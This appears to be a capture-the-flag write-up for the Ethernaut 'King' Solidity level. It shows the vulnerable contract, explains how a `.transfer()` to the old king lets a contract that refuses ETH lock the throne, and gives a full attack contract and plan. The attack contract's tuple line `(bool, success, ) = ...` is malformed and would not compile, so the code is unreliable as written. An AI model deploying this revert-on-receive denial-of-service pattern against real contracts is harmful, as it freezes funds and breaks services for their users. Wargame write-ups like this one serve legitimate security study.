# Ethernaut King Level Attack

## Goal

Break the rule of the game king

---

## Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

## Root cause

```solidity
receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
}
```

Before updating the new king, the contract tries to send ETH to the old king. If the old king is a malicious contract that refuses to receive ETH, then `.transfer()` fails and the whole transaction reverts. Then noone else can be the king after it.

## Attack contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    constructor(address payable target) payable {
        require(msg.value > 0, "Need ETH");

        (bool, success, ) = target.call{value: msg.value}("");
        require(success, "Attack failed");
    }

    receive() external payable {
        revert("I refuse to receive ETH");
    }
}
```

## Attack plan
Step 1: Deploy the `KingAttack` contract with at least the current `prize` amount

```solidity
new KingAttack{value: currentPrize}(kingAddress);
```

Step 2: Send enough ETH to become the new king.

Step 3: After that, when another contract tries to claim the king, it cannot as `KingAttack` contract refuse to receive ETH before king claim ownership. Then noone can reclaim the king and `KingAttack` contract always remain king.

